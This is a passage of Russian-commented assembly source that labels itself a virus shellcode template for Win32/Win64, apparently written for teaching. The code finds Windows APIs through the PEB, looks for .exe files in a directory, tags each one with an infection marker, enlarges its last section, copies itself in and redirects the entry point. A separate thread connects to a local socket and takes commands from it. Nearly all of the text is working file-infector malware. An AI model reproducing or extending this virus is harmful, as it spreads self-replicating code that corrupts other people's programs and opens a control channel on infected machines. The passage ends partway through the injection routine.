;
; Шаблон для шеллкода вируса под Win32/Win64
;
; jwasm -bin -nologo -Fo virus_sc_64.bin /I "C:\wininc\Include" -10p -zf0 -W2 -D_WIN64 virus_sc.asm
; jwasm -bin -nologo -Fo virus_sc_32.bin /I "C:\masm32\include" -W2 virus_sc.asm
;
;Маткин Илья Александрович     23.11.2016
;


ifdef _WIN64
CurrentStdcallNotation equ <fastcall>
CurrentCdeclNotation equ <fastcall>
else 
CurrentStdcallNotation equ <stdcall>
CurrentCdeclNotation equ <c>
.486
endif

option casemap:none
.model flat, CurrentStdcallNotation

include windows.inc


ifdef _WIN64
	CLIST_ENTRY typedef LIST_ENTRY64
	; машинное слово текущей архитектуры
	cword typedef qword
	cax equ <rax>
	cbx equ <rbx>
	ccx equ <rcx>
	cdx equ <rdx>
	csi equ <rsi>
	cdi equ <rdi>
	csp equ <rsp>
	cbp equ <rbp>
	OFFSET_PEB equ <60h>
	OFFSET_LDR equ <18h>
	OFFSET_INIT_LIST equ <30h>
	PROC_VERSION equ <8664h> 
	cur_seg_reg equ <gs>
else 
	CLIST_ENTRY typedef LIST_ENTRY32
	; машинное слово текущей архитектуры
	cword typedef dword
	cax equ <eax>
	cbx equ <ebx>
	ccx equ <ecx>
	cdx equ <edx>
	csi equ <esi>
	cdi equ <edi>
	csp equ <esp>
	cbp equ <ebp>
	OFFSET_PEB equ <30h>
	OFFSET_LDR equ <0Ch>
	OFFSET_INIT_LIST equ <1Ch>
	PROC_VERSION equ <014ch>
	cur_seg_reg equ <fs>
endif 

INJECTION_FLAG equ 011h

PeParser struct
    filename 	cword   ?   ;имя файла

    fd          HANDLE  ?   ;хендл открытого файла
    mapd        HANDLE  ?   ;хендл файловой проекции
    mem	        cword   ?   ;указатель на память спроецированного файла
    filesize    cword   ?   ;размер спроецированной части файла

    doshead     cword   ?   ;указатель на DOS заголовок
    nthead      cword   ?   ;указатель на NT заголовок
	
    impdir      cword   ?   ;указатель на массив дескрипторов таблицы импорта
    sizeImpdir  DWORD   ?   ;размер таблицы импорта
    countImpdes DWORD   ?   ;количество элементов в таблице импорта

    expdir      cword   ?   ;указатель на таблицу экспорта
    sizeExpdir  DWORD   ?   ;размер таблицы экспорта

    sections    cword   ?   ;указатель на таблицу секций (на первый элемент)
    countSec    DWORD   ?   ;количество секций
PeParser ends


Stdcall0 typedef proto CurrentStdcallNotation
Stdcall1 typedef proto CurrentStdcallNotation :cword
Stdcall2 typedef proto CurrentStdcallNotation :cword, :cword
Stdcall3 typedef proto CurrentStdcallNotation :cword, :cword, :cword
Stdcall4 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword
Stdcall5 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword
Stdcall6 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword
Stdcall7 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall8 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall9 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
;StdcallVararg typedef proto CurrentStdcallNotation :vararg
CdeclVararg typedef proto CurrentCdeclNotation :vararg

DefineStdcallVarargProto macro name:req
    sc_&name equ <StdcallVararg ptr [cbx + p_&name]>
endm

DefineStdcallProto macro name:req, count:req
    sc_&name equ <Stdcall&count ptr [cbx + p_&name]>
endm

DefineCProto macro name:req
    sc_&name equ <CdeclVararg ptr [cbx + p_&name]>
endm

DefineStr macro name:req
    ;@CatStr(str,name) db "@CatStr(,name)", 0
    str_&name db "&name&", 0
endm

DefineStrOffsets macro name:req, strNames:vararg
    name:
    for i, <&strNames>
        cword offset str_&i
    endm
    name&Count = ($ - name) / sizeof(cword)
endm

DefinePointers macro name:req, namePointers:vararg
    name:
    for i, <&namePointers>
        p_&i cword 0
    endm
endm

DefineFuncNamesAndPointers macro funcNames:vararg
    for i, <&funcNames>
        DefineStr i
    endm
    DefineStrOffsets procNames, funcNames
    DefinePointers procPointers, funcNames
endm



; Main
DefineStdcallProto CreateFileA, 7
DefineStdcallProto ReadFile, 5
DefineStdcallProto GetFileSize, 2
DefineStdcallProto CreateFileMappingA, 6
DefineStdcallProto CloseHandle, 1
DefineStdcallProto MapViewOfFile, 5
DefineStdcallProto UnmapViewOfFile, 1
DefineStdcallProto FindFirstFileA, 2
DefineStdcallProto FindNextFileA, 2
DefineStdcallProto FindClose, 1
DefineStdcallProto GetSystemDirectoryA, 2

; Threads
DefineStdcallProto SuspendThread, 1
DefineStdcallProto GetCurrentThread, 0

; Sockets
DefineStdcallProto WSAStartup, 2
DefineStdcallProto WSAGetLastError, 0
DefineStdcallProto socket, 3
DefineStdcallProto WSACleanup, 0
DefineStdcallProto send, 4
DefineStdcallProto recv, 4
DefineStdcallProto connect, 3
DefineStdcallProto htons, 1

; Additional
DefineCProto strlen
DefineCProto printf
DefineCProto system
DefineCProto memcpy



FindProcAddressByName proto stdcall :ptr byte
FindProcAddress proto stdcall :ptr byte, :ptr byte
FindProcArray proto stdcall :ptr byte, :ptr byte, :cword
InjectPeFilesInDirectory proto stdcall :ptr byte

ParsePeFileHeader proto stdcall pe:ptr byte
LoadPeFile proto stdcall :ptr byte, :ptr byte, :cword
UnloadPeFile proto stdcall pe:ptr byte

AlignToTop proto stdcall :cword, :cword

ExtendLastSection proto stdcall :ptr byte, :cword, :ptr byte, :ptr byte

CheckPeFile proto stdcall :ptr byte
InjectPeFile proto stdcall :ptr byte

ZeroMem proto stdcall :dword, :dword



sc segment

sc_start:
ifdef _WIN64
    lea cbx, sc_start
else
    call $+5
    pop cbx
    sub cbx, 5
endif
	jmp main
	
; Помимо шеллкода необходимо хранить дополнительные данные о зараженном файле.
; Их располагаем перед шеллкодом.
; адрес оригинальной точки входа;
OriginalEntryPoint:
db 8 dup(?)
; адрес, где сохранены данные секции;
OriginalSectionData:
db 8 dup(?)
; адрес, где расположены перемещенные данные.
ShellcodeData:
db 8 dup(?)

DefineStr CreateThread
DefineStr VirtualAlloc
DefineStr VirtualProtect
DefineStr LoadLibraryA

str_MsvcrtDll:
db "msvcrt.dll", 0
str_User32Dll:
db "user32.dll", 0
str_Ws2Dll:
db "Ws2_32.dll", 0
str_Memcpy:
db "memcpy", 0
str_Sleep:
db "Sleep", 0

pe_start:
ifdef _WIN64
	lea cbx, sc_start
else
	call $+5
	pop cbx
	sub cbx, pe_start + 5
endif

pe_main proc stdcall
	local   pBase:cword
	local   pLoadLibraryA:cword
	local   pVirtualAlloc:cword
	local   pVirtualProtect:cword
	local   pCreateThread:cword
	local   pMemcpy:cword
	local   pe:PeParser
	local	oldProtect:dword

	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
	; сохраняем базовый адрес
	mov [pBase], cbx

	; получаем адрес функции LoadLibraryA в kernel32.dll
	invoke FindProcAddressByName, addr [cbx + str_LoadLibraryA]
	mov [pLoadLibraryA], cax
	
	; загружаем библиотеку msvcrt.dll
	invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_MsvcrtDll]
	; загружаем библиотеку user32.dll
	invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_User32Dll]
	; загружаем библиотеку Ws2_32.dll
	invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Ws2Dll]

	; получаем адреса функций в kernel32.dll
	invoke FindProcAddressByName, addr [cbx + str_VirtualProtect]
	mov [pVirtualProtect], cax	
	invoke FindProcAddressByName, addr [cbx + str_VirtualAlloc]
	mov [pVirtualAlloc], cax	
	invoke FindProcAddressByName, addr [cbx + str_Memcpy]
	mov [pMemcpy], cax	
	invoke FindProcAddressByName, addr [cbx + str_CreateThread]
	mov [pCreateThread], cax  
	
	; выделяем память
	invoke Stdcall4 ptr [pVirtualAlloc], 0, unload_end - unload_start, MEM_COMMIT, PAGE_EXECUTE_READWRITE
	mov cdi, cax	
	invoke Stdcall4 ptr [pVirtualAlloc], 0, sc_end - sc_start, MEM_COMMIT, PAGE_EXECUTE_READWRITE
	mov csi, cax
	
	invoke CdeclVararg ptr [pMemcpy], csi, cbx, main - sc_start
	add csi, main - sc_start
	invoke CdeclVararg ptr [pMemcpy], csi, [cbx + ShellcodeData], sc_end - main
	sub csi, main - sc_start
	
	; создаем новый поток для выполнения нашего кода (общения по сети)
	invoke Stdcall6 ptr [pCreateThread], 0, 0, addr [csi + MainInSecondThread], 0, 0, 0
	
	invoke Stdcall4 ptr [pVirtualProtect], cbx, main - sc_start, PAGE_EXECUTE_READWRITE, addr [oldProtect]
	
	; копируем обратно оригинальный код
	invoke CdeclVararg ptr [pMemcpy], cdi, addr [cbx + unload_start], unload_end - unload_start
	
	invoke Stdcall4 ptr [pVirtualProtect], cdi, main - sc_start, [oldProtect], addr [oldProtect]
	; прыгаем туда
	jmp cdi

	unload_start:	
		mov csi, cword ptr [cbx + OriginalEntryPoint]
		invoke CdeclVararg ptr [pMemcpy], cbx, [cbx + OriginalSectionData], main - sc_start
		mov csp, cbp
		pop cbp
		jmp csi
	unload_end:

pe_main endp


;
; Осуществляет поиск функции по имени во всех загруженных библиотеках из PEB'а.
; void * FindProcAddressByName (char * procName);
;
FindProcAddressByName proc stdcall uses cdi cbx procName:ptr byte

    assume cur_seg_reg:nothing
    mov cbx, [cur_seg_reg:OFFSET_PEB]       ; cbx = ptr _PEB
    mov cbx, [cbx+OFFSET_LDR]      ; cbx = ptr _PEB_LDR_DATA
    lea cbx, [cbx+OFFSET_INIT_LIST]      ; cbx = ptr InInitializationOrderModuleList.Flink

    mov cdi, cbx            ; cdi = голова списка
    mov cbx, [cbx]          ; cbx = InInitializationOrderModuleList.Flink
    .while cbx != cdi
        push [procName]
        push cword ptr [cbx+sizeof(CLIST_ENTRY)]    ; LDR_DATA_TABLE_ENTRY.DllBase
                                    ; 10h - смещение от элемента InInitializationOrderLinks
        call FindProcAddress
        .if cax
            .break          ; в случае возврата cax будет содержать адрес функции
        .endif
        
        mov cbx, [cbx]          ; cbx = LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks.Flink
        xor cax, cax            ; обнуляем cax для возврата из функции
    .endw

    ret

FindProcAddressByName endp

;
; Осуществляет поиск адреса функции по ее имени в таблице экспорта
; void *FindProcAddress (void *baseLib, char *procName)
;
FindProcAddress proc stdcall uses cdi csi cbx baseLib:ptr byte, procName:ptr byte
	local functionsArray:cword
	local namesArray:cword
	local nameOcdinalsArray:cword

    mov cbx, [baseLib]
    
    mov eax, [cbx].IMAGE_DOS_HEADER.e_lfanew    ; cax = offset PE header
    
    ; esi = rva export directory
    mov esi, [cbx + cax].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    .if !esi
		xor cax, cax
		jmp find_ret
	.endif
	add csi, cbx                ; esi = va export directory
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions    ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    add cax, cbx
    mov [functionsArray], cax
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfNames        ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNames
    .if !eax
		xor cax, cax
		jmp find_ret
	.endif
	add cax, cbx
    mov [namesArray], cax
    
    mov eax, [csi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNameOcdinals
    .if !eax
		xor cax, cax
		jmp find_ret
	.endif
	add cax, cbx
    mov [nameOcdinalsArray], cax
    
    xor edi, edi

	@@:
        cmp edi, [csi].IMAGE_EXPORT_DIRECTORY.NumberOfNames      ; cdi < IMAGE_EXPORT_DIRECTORY.NumberOfNames
        
        ; после сравнения строк на предыдущей итерации eax=0
        jge find_ret

        mov cax, [namesArray]
        mov eax, [cax+cdi*sizeof(dword)]
        add cax, cbx
        push [procName]
        push cax
        call CmpStr
        test cax, cax
        jne  @f

        inc edi
        jmp @b
	@@:
    
    mov cax, [nameOcdinalsArray]
    movzx cdi, word ptr [cax+cdi*sizeof(word)]
    mov cax, [functionsArray]
    mov eax, [cax+cdi*sizeof(dword)]
    add cax, cbx
    
find_ret:    
    ret
FindProcAddress endp

;
; функция сравнения ASCII-строк
; bool CmpStr (char *str1, char *str2)
;
CmpStr:
    mov cax, [csp+sizeof(cword)]
    mov ccx, [csp+2*sizeof(cword)]
@@:
    mov dl, [cax]
    cmp dl, byte ptr [ccx]
    jne ret_false
    test dl, dl
    je ret_true
    inc cax
    inc ccx
    jmp @b
ret_false:
    xor cax, cax
    ; при равенстве строк возвращается адрес нулевого символа одной из строк
    ; но главное, что ненулевое значение
ret_true:
    retn 2 * sizeof(cword)

; обнуляет память буфера
ZeroMem proc stdcall buf:dword, buf_size:dword
	local i:dword
	mov [i], 0
	lea edx, [buf]
	mov ecx, [buf_size]
	.while [i] < ecx
		mov byte ptr [edx], 0
		inc edx
		inc [i]
	.endw
	ret
ZeroMem endp

;
; Main
;
main proc stdcall
	local   pBase:cword
	local   pLoadLibraryA:cword
	local 	offsetNewData:ptr byte
	local 	rvaNewData:ptr byte

	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
    ; сохраняем базовый адрес
    mov [pBase], cbx

    invoke FindProcAddressByName, addr [cbx + str_LoadLibraryA]
    mov [pLoadLibraryA], cax
    
    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_MsvcrtDll]
	invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_User32Dll]

    invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount
	
    invoke InjectPeFilesInDirectory, addr [cbx + injDirName]     
	
	ret
main endp


; общение с программой управления Шеллкодом
MainInSecondThread proc 
	local	sock:SOCKET
	local	addr1:sockaddr_in 
	local	wsaData:WSADATA
	local   i:cword
	local   pSleep:cword
	local   recvSize:dword
	local   buf[4096]:byte
	local   command[1024]:byte
	
	local hFindFile:HANDLE
	local hOpenFile:HANDLE
	local findData:WIN32_FIND_DATAA

	main2_start:
	ifdef _WIN64
		lea cbx, main2_start
		sub cbx, main2_start
	else
		call $+5
		pop cbx
		sub cbx, 5 + main2_start
	endif
		
	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
    invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount
	
	invoke FindProcAddressByName, addr [cbx + str_Sleep]
	mov [pSleep], cax	
	invoke Stdcall1 ptr [pSleep], 1000
	;invoke sc_Sleep, 1000
	
	invoke InjectPeFilesInDirectory, addr [cbx + injDirName]
	
	
	invoke sc_WSAStartup , 202h, addr [wsaData]
	
	invoke sc_socket, AF_INET, SOCK_STREAM, IPPROTO_IP
	mov [sock], eax
	
	; memset
	mov [i], 0
	lea cdx, [addr1]
	.while [i] < sizeof(sockaddr_in)
		mov byte ptr [cdx], 0
		inc cdx
		inc [i]
	.endw
	
	; connect
		
	invoke sc_htons, 1111
	mov [addr1].sin_port, ax
	mov [addr1].sin_addr.S_un.S_addr, 0100007Fh	
	invoke sc_connect, [sock], addr [addr1], sizeof(sockaddr_in)
	
	; hello message
	invoke sc_strlen, addr [cbx + strHello]
	invoke sc_send, [sock], addr [cbx + strHello], cax, 0
	
	; чтение и запись через сокеты
	.while 1
		; считываем команду из сокета
		; recvSize = recv (sock, buf, 1024, 0)
		invoke ZeroMem, addr [command], 1024
		invoke sc_recv, [sock], addr [command], 1024, 0
		mov [recvSize], eax
		; command[recvSize] = 0;
		lea edi, [command]
		mov byte ptr [edi + eax], 0
		

		; проверка на отключение клиента от сервера-шеллкода
		; if [recvSize] == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET
		.if [recvSize] == SOCKET_ERROR
			invoke sc_WSAGetLastError
			.if eax == WSAECONNRESET
				; printf("client disconnected!\n")
				; invoke sc_printf, addr [ebx + str_secFormat], addr [ebx + str_client_disconnected];
				.break
			.endif
		.endif
		
		.if [recvSize] ; если не пустая команда		
			; обработка команд
			.if [command] == '0' 		; команда отключения от сервера						
				.break					; выходим из бесконечного цикла
			.else
				invoke sc_printf, addr [ebx + strDecFormat], addr [command]
				invoke sc_printf, addr [ebx + strFormat], addr [command]
			.endif			
		.endif
	.endw
	
	invoke sc_WSACleanup
   	
	ret
MainInSecondThread endp


; Осуществляет поиск адресов функций, смещения до имен которых от регистра ebx,
; переданы в первом аргументе funcNames.
; Адреса сохраняются по соответствующим индексам в массиве funcAddress.
; void FindProcArray (in char **funcNames, out void **funcAddress, int funcCount);
FindProcArray proc stdcall uses cdi funcNames:ptr byte, funcAddress:ptr byte, funcCount:cword
	local i:cword
    
    mov [i], 0

@@:
    mov cax, [i]
    cmp cax, [funcCount]
    jge @f
    
    mov cdi, [funcNames]
    mov cdi, [cdi + sizeof(cword) * cax]
    add cdi, cbx
    push cdi
    mov cdi, [funcAddress]
    lea cdi, [cdi + sizeof(cword) * cax]
    call FindProcAddressByName
    mov [cdi], cax
    
    inc [i]
    jmp @b
@@:

    ret
FindProcArray endp

;
; Внедрение в PE-файлы в директории dirName
;
InjectPeFilesInDirectory proc stdcall uses cdi dirName:ptr byte
	local hFindFile:HANDLE
	local findData:WIN32_FIND_DATAA
	local pe:PeParser
	local nameLen:cword
	local fullName[100]:byte
		
	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
    invoke sc_strlen, [dirName]
    mov [nameLen], cax
	invoke sc_memcpy, addr [fullName], [dirName], [nameLen]
	mov cax, [nameLen]
    add cax, [dirName]
    mov byte ptr [cax], '/'
    inc cax
    mov byte ptr [cax], '*'
    inc cax
    mov byte ptr [cax], '.'
    inc cax
    mov byte ptr [cax], 'e'
    inc cax
    mov byte ptr [cax], 'x'
    inc cax
    mov byte ptr [cax], 'e'
    inc cax
    mov byte ptr [cax], 0
	
	invoke sc_FindFirstFileA, [dirName], addr findData
    mov [hFindFile], cax
	
	mov cax, [dirName]
	add cax, [nameLen]
	mov byte ptr[cax], 0
    
@@:
	lea cdi, [fullName]
	add cdi, [nameLen]
	invoke sc_memcpy, cdi, addr [findData].WIN32_FIND_DATAA.cFileName, 90
	
	invoke LoadPeFile, addr [fullName], addr [pe], 0
	.if cax		
		invoke sc_printf, addr [cbx + strFormat], addr [fullName]	
		invoke InjectPeFile, addr [pe]
		invoke UnloadPeFile, addr [pe]
	.endif

    invoke sc_FindNextFileA, [hFindFile], addr [findData]
    test cax, cax
    je @f
    jmp @b

@@:	
    invoke sc_FindClose, [hFindFile]

    ret
InjectPeFilesInDirectory endp

;
; Выравнивание границ
;
AlignToTop proc stdcall value:cword, sectionAlign:cword	
	; ecx = ~ (align - 1)
	mov ccx, [sectionAlign]
	dec ecx
	not ecx
	; eax = (value + align - 1) & ecx
	mov cax, [sectionAlign]
	dec eax
	add cax, [value]
	and eax, ecx	
	ret
AlignToTop endp

;
; Разбор заголовка PE-файла
;
ParsePeFileHeader proc stdcall uses csi cdi pe:ptr byte 
	local i:dword
	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
    mov csi, [pe]
    assume csi: ptr PeParser
    
    mov cax, [csi].mem
    mov [csi].doshead, cax
    
    .if (IMAGE_DOS_HEADER ptr [cax]).e_magic != IMAGE_DOS_SIGNATURE
        xor cax, cax
        ret
    .endif
    
	xor cdi, cdi
    mov edi, (IMAGE_DOS_HEADER ptr [cax]).e_lfanew
    add cdi, [csi].mem
    mov [csi].nthead, cdi
    assume cdi: ptr IMAGE_NT_HEADERS
    
    .if [cdi].Signature != IMAGE_NT_SIGNATURE
        xor cax, cax
        ret
    .endif
	
    movzx cax, [cdi].FileHeader.SizeOfOptionalHeader
    lea cax, [cdi].OptionalHeader[cax]
    mov [csi].sections, cax
    
    movzx eax, [cdi].FileHeader.NumberOfSections
    mov [csi].countSec, eax
    
    mov cdi, [csi].sections
    xor ccx, ccx
    mov [i], ecx
    .while ecx < [csi].countSec
        ; invoke sc_printf, addr [cbx + strFormat], cdi
        ; invoke sc_printf, addr [cbx + strFormat], cdi
		add cdi, sizeof(IMAGE_SECTION_HEADER)
        inc [i]
        mov ecx, [i]
    .endw

    mov cax, 1
    ret
ParsePeFileHeader endp


LoadPeFile proc stdcall uses cdi filename:ptr byte, pe:ptr byte, filesize:cword
	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
    mov cdi, [pe]
    assume cdi: ptr PeParser
	
    mov cax, [filename]
    mov [cdi].filename, cax
	
    invoke sc_CreateFileA, filename, GENERIC_READ or GENERIC_WRITE or GENERIC_EXECUTE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
    mov [cdi].fd, cax
    .if [cdi].fd == INVALID_HANDLE_VALUE
        ;invoke crt_puts, $CTA0 ("Error open file\n")
        xor cax, cax
        ret
    .endif
	
    .if [filesize]
        mov cax, [filesize]
        mov [cdi].filesize, cax
    .else
        invoke sc_GetFileSize, [cdi].fd, 0
        mov [cdi].filesize, cax
    .endif
	
    invoke sc_CreateFileMappingA, [cdi].fd, 0, PAGE_EXECUTE_READWRITE, 0, [cdi].filesize, 0
    mov [cdi].mapd, cax
    .if [cdi].mapd == 0
        invoke sc_CloseHandle, [cdi].fd
        ;invoke crt_puts, $CTA0 ("Error create fie mapping\n")
        xor cax, cax
        ret
    .endif
    
    invoke sc_MapViewOfFile, [cdi].mapd, FILE_MAP_ALL_ACCESS, 0, 0, 0
    mov [cdi].mem, cax
    .if [cdi].mem == 0
        invoke sc_CloseHandle, [cdi].mapd
        invoke sc_CloseHandle, [cdi].fd
        ;invoke crt_puts, $CTA0 ("Error mapping file\n")
        xor cax, cax
        ret
    .endif
	
	invoke ParsePeFileHeader, [pe]
    .if !cax
        invoke UnloadPeFile, [pe]
        ;invoke crt_puts, $CTA0 ("Error parse file\n")
        xor cax, cax
        ret
    .endif
    
    mov cax, 1
    ret
LoadPeFile endp


UnloadPeFile proc stdcall uses cdi pe:ptr byte	
	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
    mov cdi, [pe]
    assume cdi: ptr PeParser
    
    invoke sc_UnmapViewOfFile, [cdi].mem
    invoke sc_CloseHandle, [cdi].mapd
    invoke sc_CloseHandle, [cdi].fd

    ret    
UnloadPeFile endp

; 
; Функция увеличивает размер последней секции PE-файла.
; При этом данные, которые могут находиться за последней секцией
; будут затёрты. Поэтому программа после заражения может не работать.
;
; @return 	смещение от начала секции до новых данных и виртуальный адрес новых данных.
;
ExtendLastSection proc stdcall uses cdi csi pe:ptr byte, additionalSize:cword, rvaNewData:ptr byte, offsetNewData:ptr byte
	local sectionAlign:dword
	local lastSection:ptr byte
	local offsetToNewSectionData:dword
	local newVirtualAndFileSize:dword
	local deltaFileSize:dword
	; local addImageSize:dword
		
	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
	; cdi = pe
	mov cdi, [pe]
    assume cdi: ptr PeParser
	
	; csi = cdi->nthead
	mov csi, [cdi].nthead
    assume csi: ptr IMAGE_NT_HEADERS
	
	; sectionAlign = pe->nthead->OptionalHeader.SectionAlignment;
	mov eax, [csi].OptionalHeader.SectionAlignment
	mov [sectionAlign], eax
	
	; lastSection = pe->sections + (pe->countSec - 1) * sizeof(IMAGE_SECTION_HEADER);
	xor cax, cax
	mov eax, [cdi].countSec
	dec eax
	imul eax, eax, sizeof(IMAGE_SECTION_HEADER)
	add cax, [cdi].sections
	mov [lastSection], cax
	
	; csi = lastSection
	mov csi, [lastSection]
    assume csi: ptr IMAGE_SECTION_HEADER
	
    
	mov ecx, [csi].SizeOfRawData
	mov edx, [csi].Misc.VirtualSize
	.if edx > ecx
		mov [offsetToNewSectionData], edx
	.else
		mov [offsetToNewSectionData], ecx
	.endif
	
    ; Выравниваем новый размер по величине выравнивания в памяти.
	; cdx = sectionAlign
	xor cdx, cdx
	mov edx, [sectionAlign]	
    ; cax = offsetToNewSectionData + additionalSize;
	mov ccx, [additionalSize]
	xor cax, cax
	mov eax, [offsetToNewSectionData]
	add eax, ecx
    ; newVirtualAndFileSize = AlignToTop (newVirtualAndFileSize, align);
	invoke AlignToTop, cax, cdx
	mov [newVirtualAndFileSize], eax

    ; на сколько увеличивается размер файла
    ; deltaFileSize = newVirtualAndFileSize - last_section->SizeOfRawData;	
	sub eax, [csi].SizeOfRawData
	mov [deltaFileSize], eax	
	
    ; Выгружаем файл и загружаем с увеличенным размером.
    ; Новый блок будет заполнен нулями.
    ; UnloadPeFile (pe);
	invoke UnloadPeFile, [pe]
	; cdx = pe->filesize + deltaFileSize
	xor ccx, ccx
	mov ecx, [deltaFileSize]
	mov cdx, [cdi].filesize
	add cdx, ccx
    ; LoadPeFile (pe->filename, pe, pe->filesize + deltaFileSize);
	invoke LoadPeFile, [cdi].filename, [pe], cdx
	
	; снова пересчитываем lastSection, потому что она изменилась
    ; lastSection = pe->sections + (pe->countSec - 1) * sizeof(IMAGE_SECTION_HEADER);
	xor cax, cax
	mov eax, [cdi].countSec
	dec eax
	imul eax, eax, sizeof(IMAGE_SECTION_HEADER)
	add cax, [cdi].sections
	mov [lastSection], cax	
	
	; csi = lastSection
	mov csi, [lastSection]
    assume csi: ptr IMAGE_SECTION_HEADER
	
    ; обновляем размер образа программы (если надо)
    ; pe->nthead->OptionalHeader.SizeOfImage += AlignToTop (newVirtualAndFileSize, align) - AlignToTop (last_section->Misc.VirtualSize, align);
	; AlignToTop (newVirtualAndFileSize, align)
	xor cdx, cdx
	mov edx, [sectionAlign]
	xor cax, cax
	mov eax, [newVirtualAndFileSize]
	invoke AlignToTop, cax, cdx
	push cax
	; AlignToTop (last_section->Misc.VirtualSize, align)
	xor cdx, cdx
	mov edx, [sectionAlign]
	xor cax, cax
	mov eax, [csi].Misc.VirtualSize
	invoke AlignToTop, cax, cdx
	pop ccx
	; ecx = AlignToTop (newVirtualAndFileSize, align) - AlignToTop (last_section->Misc.VirtualSize, align)
	sub ecx, eax	
	; csi = pe->nthead->OptionalHeader.SizeOfImage += ecx
	mov csi, [cdi].nthead
    assume csi: ptr IMAGE_NT_HEADERS
	add [csi].OptionalHeader.SizeOfImage, ecx
	
	; csi = lastSection
	mov csi, [lastSection]
    assume csi: ptr IMAGE_SECTION_HEADER
	
    ; обновляем размеры секции в файле и в памяти
	mov eax, [newVirtualAndFileSize]
    ; last_section->SizeOfRawData = newVirtualAndFileSize;
	mov [csi].SizeOfRawData, eax
    ; last_section->Misc.VirtualSize = newVirtualAndFileSize;
	mov [csi].Misc.VirtualSize, eax
	
    ; *rvaNewData = last_section->VirtualAddress + offsetToNewSectionData;
	xor cax, cax
	mov eax, [csi].VirtualAddress
	add eax, [offsetToNewSectionData]
	mov cdx, [rvaNewData]
	mov [cdx], cax
    ; *offsetNewData = last_section->PointerToRawData + offsetToNewSectionData;	
	xor cax, cax
	mov eax, [csi].PointerToRawData
	add eax, [offsetToNewSectionData]
	mov cdx, [offsetNewData]
	mov [cdx], cax
	
	ret	
ExtendLastSection endp

;
; проверяет, заражён ли файл, и его разрядность
; @param pe 	проверяемый pe-файл
; @return 		0 - НЕ заражен и разрядность такая же, 1 - заражен или разрядность другая
; 
CheckPeFile proc stdcall uses cdi csi pe:ptr byte	
	; cdi = pe
	mov cdi, [pe]
    assume cdi: ptr PeParser	
	; csi = pe->nthead
	mov csi, [cdi].nthead
    assume csi: ptr IMAGE_NT_HEADERS
	
    invoke sc_printf, addr [cbx + strFormat], addr [cbx + strCheckPeFile]
	
	.if [csi].FileHeader.Machine != PROC_VERSION
		mov cax, 1
		ret
	.endif
	
	; проверяем, внедрялись ли уже в этот файл
	.if [csi].OptionalHeader.MajorLinkerVersion == INJECTION_FLAG
		mov cax, 1
		ret
	.endif
	
    invoke sc_printf, addr [cbx + strFormat], addr [cbx + strPeFileWillBeInjected]
	
	; Этот файл будем заражать - возвращаем 0
	mov [csi].OptionalHeader.MajorLinkerVersion, INJECTION_FLAG	
	xor cax, cax
	ret
CheckPeFile endp 

; Внедряет данные и код в новую область памяти в файле.
InjectPeFile proc stdcall uses cdi csi pe:ptr byte	
	local offsetNewData:ptr byte
	local rvaNewData:ptr byte

	ifdef _WIN64
		and csp, 0FFFFFFFFFFFFFFF0h
	endif
	
	; проверяем, не заразили ли мы еще этот файл, и такая же ли у него разрядность
	invoke CheckPeFile, [pe]
	.if cax
		ret
	.endif
	
	; увеличиваем счетчик зараженных файлов
	inc dword ptr [cbx + injCount]
	
    ; расширяем последнюю секцию
    ; ExtendLastSection (pe, 2 * sizeof(DWORD) + codeSize + ((DWORD)InjectCode - (DWORD)InjectedCode), &rvaNewData, &offsetNewData);
	invoke ExtendLastSection, [pe], sc_end - sc_start, addr [rvaNewData], addr [offsetNewData]
	
	; cdi = pe
	mov cdi, [pe]
    assume cdi: ptr PeParser
	
	; csi = pe->nthead
	mov csi, [cdi].nthead
    assume csi: ptr IMAGE_NT_HEADERS
	
    ; помещаем адрес оригинальной точки входа
    ; OriginalEntryPoint = pe->nthead->OptionalHeader.AddressOfEntryPoint + pe->nthead->OptionalHeader.ImageBase;
	xor cax, cax
	mov eax, [csi].OptionalHeader.AddressOfEntryPoint
	add cax, [csi].OptionalHeader.ImageBase
	mov cword ptr [cbx + OriginalEntryPoint], cax
	
	; OriginalSectionData = rvaNewData + pe->nthead->OptionalHeader.ImageBase
	; ShellcodeData 		  = rvaNewData + pe->nthead->OptionalHeader.ImageBase + (main - sc_start)
	mov cax, [rvaNewData]
	add cax, [csi].OptionalHeader.ImageBase
	mov cword ptr [cbx + OriginalSectionData], cax
	add cax, main - sc_start
	mov cword ptr [cbx + ShellcodeData], cax
	
